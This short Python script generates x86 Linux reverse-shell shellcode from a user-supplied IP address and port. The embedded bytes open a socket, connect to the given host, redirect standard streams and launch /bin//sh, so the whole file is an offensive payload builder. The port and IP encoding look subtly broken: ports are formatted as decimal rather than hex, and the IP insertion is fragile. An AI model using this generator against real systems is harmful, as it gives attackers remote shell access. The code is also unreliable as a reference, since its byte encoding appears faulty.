#!/usr/bin/env python3

import sys
import struct
import socket
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--ip")
parser.add_argument('-p', "--port")
args = parser.parse_args()

port = int(args.port)
ip = args.ip
port = struct.pack("!H", port)
port = ("{}".format(''.join('\\x{:02}'.format(b) for b in port)))
ip = socket.inet_aton(ip)
ip = str(ip).lstrip("b'")
ip = ip.rstrip("'")

shellcode = """
\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xfb\\x31\\xc9\\x51\\%s
\\x66\\x68%s
\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80""" % (ip, port)

print ("Shellcode:")
print(shellcode.replace("\n", ""))
